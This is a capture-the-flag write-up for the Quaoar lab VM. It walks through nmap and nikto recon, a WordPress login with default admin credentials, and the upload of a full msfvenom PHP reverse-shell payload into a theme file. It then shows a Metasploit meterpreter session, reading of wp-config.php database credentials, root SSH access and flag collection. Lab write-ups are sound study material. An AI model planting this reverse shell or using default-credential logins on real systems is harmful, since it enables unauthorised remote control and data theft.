# INTRO
This box is a part of a three part CTF series. The objective of the box is to get all 3 flags and acquire root. This being the first box is really really easy.

# RECON AND ENUM

Using netdiscover I get the local ip of the VM.
```
192.168.1.171   1a:d6:c7:bb:0c:c9      4     240  Unknown vendor                                                                                                                                                                            
```
Right after I ran a nmap scan.
```
└─# nmap -sV -sC -A -Pn 192.168.1.171
Nmap scan report for 192.168.1.171
Host is up (0.049s latency).
Not shown: 991 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d00a61d5d03a38c267c3c3428faeabe5 (DSA)
|   2048 bce03bef97999a8b9e96cf02cdf15edc (RSA)
|_  256 8c734683988f0df7f5c8e458680f8075 (ECDSA)
53/tcp  open  domain      ISC BIND 9.8.1-P1
| dns-nsid: 
|_  bind.version: 9.8.1-P1
80/tcp  open  http        Apache httpd 2.2.22 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_Hackers
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.22 (Ubuntu)
110/tcp open  pop3?
|_pop3-capabilities: UIDL SASL TOP STLS PIPELINING CAPA RESP-CODES
|_ssl-date: 2023-01-05T12:43:09+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T04:32:43
|_Not valid after:  2026-10-07T04:32:43
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: ENABLE IDLE IMAP4rev1 more have OK post-login Pre-login capabilities listed LOGINDISABLEDA0001 ID LOGIN-REFERRALS LITERAL+ STARTTLS SASL-IR
|_ssl-date: 2023-01-05T12:43:09+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T04:32:43
|_Not valid after:  2026-10-07T04:32:43
445/tcp open  netbios-ssn Samba smbd 3.6.3 (workgroup: WORKGROUP)
993/tcp open  ssl/imap    Dovecot imapd
|_ssl-date: 2023-01-05T12:43:09+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T04:32:43
|_Not valid after:  2026-10-07T04:32:43
|_imap-capabilities: ENABLE IDLE IMAP4rev1 AUTH=PLAINA0001 OK more have LITERAL+ listed capabilities ID LOGIN-REFERRALS Pre-login post-login SASL-IR
995/tcp open  ssl/pop3s?
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T04:32:43
|_Not valid after:  2026-10-07T04:32:43
|_ssl-date: 2023-01-05T12:43:09+00:00; +1s from scanner time.
|_pop3-capabilities: UIDL SASL(PLAIN) TOP USER PIPELINING CAPA RESP-CODES
MAC Address: 1A:D6:C7:BB:0C:C9 (Unknown)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.5
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: QUAOAR, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
|_clock-skew: mean: 50m01s, deviation: 2h02m28s, median: 0s
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Unix (Samba 3.6.3)
|   NetBIOS computer name: 
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-01-05T07:43:01-05:00

TRACEROUTE
HOP RTT      ADDRESS
1   48.62 ms 192.168.1.171

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 196.91 seconds
```
I see the port 80 open, I go to the webpage with nothing there other than an image and nothing in the page source. Next I used nikto to check for vulnerabilities.
```
└─# nikto -h 192.168.1.171           
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.171
+ Target Hostname:    192.168.1.171
+ Target Port:        80
+ Start Time:         2023-01-05 16:52:19 (GMT4)
---------------------------------------------------------------------------
+ Server: Apache/2.2.22 (Ubuntu)
+ Server may leak inodes via ETags, header found with file /, inode: 133975, size: 100, mtime: Mon Oct 24 08:00:10 2016
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3
+ Entry '/wordpress/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 2 entries which should be manually viewed.
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html
+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8727 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2023-01-05 16:59:07 (GMT4) (408 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
From the nikto scan we can conclude that wordpress is being used. Instead of using wpscan since the description on vulnhub said its very easy, I straight away went to http://192.168.1.171/wordpress/wp-admin/ and entered admin:admin for access and it works.
# EXPLOITATION
Following that I went to the editor page to upload a php virus generated using msfvenom to the 404.php permalink.
```
/*<?php /**/ error_reporting(0); $ip = 'ip'; $port = port; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die(); 
```
Set up a listener using msfconsole.
```
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 192.168.1.120
lhost => 192.168.1.120
msf6 exploit(multi/handler) > set lport 4444
lport => 4444
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.1.120:4444 
[*] Sending stage (39927 bytes) to 192.168.1.171
[*] Meterpreter session 1 opened (192.168.1.120:4444 -> 192.168.1.171:55623) at 2023-02-10 19:28:47 +0400

meterpreter > 
```
There was a flag in the /home/wpadmin directory.
```
meterpreter > cat flag.txt
2bafe61f03117ac66a73c3c514de796e
```
Next I checked the wp-config.php file.
```
meterpreter > cat wp-config.php
<?php
/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, WordPress Language, and ABSPATH. You can find more information
 * by visiting {@link http://codex.wordpress.org/Editing_wp-config.php Editing
 * wp-config.php} Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'rootpassword!');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');
/** */
define('WP_HOME','/wordpress/');
define('WP_SITEURL','/wordpress/');
/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         '`47hAs4ic+mLDn[-PH(7t+Q+J)L=8^ 8&z!F ?Tu4H#JlV7Ht4}Fsdbg2us1wZZc');
define('SECURE_AUTH_KEY',  'g#vFXk!k|3,w30.VByn8+D-}-P(]c1oI|&BfmQqq{)5w)B>$?5t}5u&s)#K1@{%d');
define('LOGGED_IN_KEY',    '[|;!?pt}0$ei+>sS9x+B&$iV~N+3Cox-C5zT|,P-<0YsX6-RjNA[WTz-?@<F[O@T');
define('NONCE_KEY',        '7RFLj2-NFkAjb6UsKvnN+1aj<Vm++P9<D~H+)l;|5?P1*?gi%o1&zKaXa<]Ft#++');
define('AUTH_SALT',        'PN9aE9`#7.uL|W8}pGsW$,:h=Af(3h52O!w#IWa|u4zfouV @J@Y_GoC8)ApSKeN');
define('SECURE_AUTH_SALT', 'wGh|W wNR-(p6fRjV?wb$=f4*KkMM<j0)H#Qz-tu.r~2O*Xs9W3^_`c6Md+ptRR.');
define('LOGGED_IN_SALT',   '+36M1E5.MC;-k:[[_bs>~a0o_c$v?ok4LR|17 ]!K:Z8-]lcSs?EXC`TO;X3in[#');
define('NONCE_SALT',       'K=Sf5{EDu3rG&x=#em=R}:-m+IRNs<@4e8P*)GF#+x+,zu.D8Ksy?j+_]/Kcn|cn');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each a unique
 * prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * WordPress Localized Language, defaults to English.
 *
 * Change this to localize WordPress. A corresponding MO file for the chosen
 * language must be installed to wp-content/languages. For example, install
 * de_DE.mo to wp-content/languages and set WPLANG to 'de_DE' to enable German
 * language support.
 */
define('WPLANG', '');

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
```
We get the root password as 'rootpassword!' and ultimately I ssh into the vm.
```
└─$ ssh root@192.168.1.171
root@192.168.1.171's password: 
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic-pae i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Fri Feb 10 10:39:36 EST 2023

  System load:  0.08              Processes:             103
  Usage of /:   30.3% of 7.21GB   Users logged in:       0
  Memory usage: 60%               IP address for eth0:   192.168.1.171
  Swap usage:   0%                IP address for virbr0: 192.168.122.1

  Graph this data and manage this system at https://landscape.canonical.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Sat Jan  7 09:33:46 2023 from 192.168.1.120
root@Quaoar:~# 
```
# POST EXPLOITATION
We also get the flag in the root directory.
```
root@Quaoar:~# cat flag.txt 
8e3f9ec016e3598c5eec11fd3d73f6fb
```
After digging through the crontabs I found an unusual directory and found the final flag there.
```
root@Quaoar:/# cd etc
root@Quaoar:/etc# cd cron.d
root@Quaoar:/etc/cron.d# cat php5
# /etc/cron.d/php5: crontab fragment for php5
#  This purges session files older than X, where X is defined in seconds
#  as the largest value of session.gc_maxlifetime from all your php.ini
#  files, or 24 minutes if not defined.  See /usr/lib/php5/maxlifetime
# Its always a good idea to check for crontab to learn more about the operating system good job you get 50! - d46795f84148fd338603d0d6a9dbf8de
# Look for and purge old sessions every 30 minutes
09,39 *     * * *     root   [ -x /usr/lib/php5/maxlifetime ] && [ -d /var/lib/php5 ] && find /var/lib/php5/ -depth -mindepth 1 -maxdepth 1 -type f -cmin +$(/usr/lib/php5/maxlifetime) ! -execdir fuser -s {} 2>/dev/null \; -delete
root@Quaoar:/etc/cron.d# 
```
